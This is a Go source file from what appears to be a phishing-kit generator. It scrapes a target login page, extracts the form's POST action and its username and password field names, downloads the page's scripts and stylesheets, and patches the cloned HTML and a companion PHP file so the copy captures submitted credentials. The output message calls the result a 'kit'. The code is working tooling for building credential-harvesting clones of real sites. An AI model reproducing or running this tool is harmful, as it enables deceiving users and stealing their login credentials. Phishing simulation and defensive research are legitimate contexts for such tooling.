package main

import (
	"fmt"
	"github.com/gocolly/colly"
	"net/url"
	"os"
	"path"
	"path/filepath"
)

// getFormPost checks if there is a POST with an action and returns the path, login attribute name, and password attribute name.
func getFormPost(urlin string) (string, string, string) {
	c := colly.NewCollector(colly.UserAgent(agent))

	var postPath, postLogin, postPassword string

	c.OnHTML("form[method=post]", func(e *colly.HTMLElement) {
		postPath = e.Attr("action")

		e.ForEach("input[type=text]:not([hidden=hidden])", func(_ int, login *colly.HTMLElement) {
			postLogin = login.Attr("name")
		})

		e.ForEach("input[type=password]", func(_ int, password *colly.HTMLElement) {
			postPassword = password.Attr("name")
		})
	})

	c.Visit(urlin)

	return postPath, postLogin, postPassword
}

func initiateCollector(urlin string) {
	c := colly.NewCollector(colly.UserAgent(agent))

	// Get parameters of the form in the HTML
	fmt.Printf("Navigating to %s using the following user agent: %s\n\n", urlin, agent)
	postPath, postLogin, postPassword := getFormPost(urlin)

	if postPath == "" || postLogin == "" || postPassword == "" {
		fmt.Println("[!] error: no compatible form found in the given URL!\n")
		os.Exit(1)
	} else {
		fmt.Printf("Parameters found in the form of the given URL:\n- post action: '%s'\n- login attribute name: '%s'\n- password attribute name: '%s'\n\n", postPath, postLogin, postPassword)
	}

	var remotePaths []string
	var localPaths []string

	// Parse given URL to create destination folder for downloaded files
	parsedURL, err := url.Parse(urlin)
	if err != nil {
		fmt.Printf("Error parsing the URL: %s\n", err)
		os.Exit(1)
	}

	// Prepare folder for saving files
	destFolder = filepath.Join(destFolder, parsedURL.Host)
	urlinPath := parsedURL.Path

	// Create destination folder
	if err := mkdirIfNotExist(destFolder); err != nil {
		fmt.Printf("Error creating the destination folder: %s\n", err)
		os.Exit(1)
	}

	// OnResponse -> download file in a specific directory
	c.OnResponse(func(resp *colly.Response) {
		pathfile := resp.Request.URL.RequestURI()

		p, err := url.Parse(resp.Request.URL.String())
		if err != nil {
			fmt.Printf("Error parsing the link of a file: %s\n", err)
			os.Exit(1)
		}

		fold := path.Dir(p.EscapedPath())
		filename := path.Base(p.EscapedPath())

		if fold != "" {
			if err := mkdirIfNotExist(filepath.Join(destFolder, fold)); err != nil {
				fmt.Printf("Error creating the directory to save files: %s\n", err)
				os.Exit(1)
			}
		}

		if urlinPath == pathfile {
			filename = "index.html"
		} else {
			localPaths = append(localPaths, path.Join(fold, filename))
		}

		if err := resp.Save(filepath.Join(destFolder, fold, filename)); err != nil {
			fmt.Printf("Error saving file in the appropriate directory: %s\n", err)
			os.Exit(1)
		}
	})

	// On every script tag found linked in the HTML -> visit and download
	c.OnHTML("script", func(e *colly.HTMLElement) {
		link := e.Attr("src")
		if link != "" && !find(remotePaths, link) {
			remotePaths = append(remotePaths, link)
			c.Visit(e.Request.AbsoluteURL(link))
		}
	})

	// On every css file found linked in the HTML -> visit and download
	c.OnHTML("link[rel=stylesheet]", func(e *colly.HTMLElement) {
		link := e.Attr("href")
		if link != "" && !find(remotePaths, link) {
			remotePaths = append(remotePaths, link)
			c.Visit(e.Request.AbsoluteURL(link))
		}
	})

	// Start scraping
	c.Visit(urlin)

	// Patch HTML file to make it compatible with the PHP file
	if err := patchHtml(destFolder, remotePaths, localPaths, phpFilename); err != nil {
		fmt.Printf("Error patching the HTML: '%s'\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("HTML file patched and saved in '%s'\n", destFolder)
	}

	// Copy PHP file to the dest folder
	if err := copyPhpToKit(phpFilename, destFolder); err != nil {
		fmt.Printf("Error copying the PHP file in the destination folder: '%s'\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("PHP file saved in '%s'\n", destFolder)
	}

	// Patch the PHP file to make the kit work
	if err := patchPhp(filepath.Join(destFolder, phpFilename), postLogin, postPassword, urlin); err != nil {
		fmt.Printf("Error patching the PHP file: %s\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("\n[*] Operation completed! Kit created for '%s' and saved in '%s'\n", urlin, destFolder)
	}
}
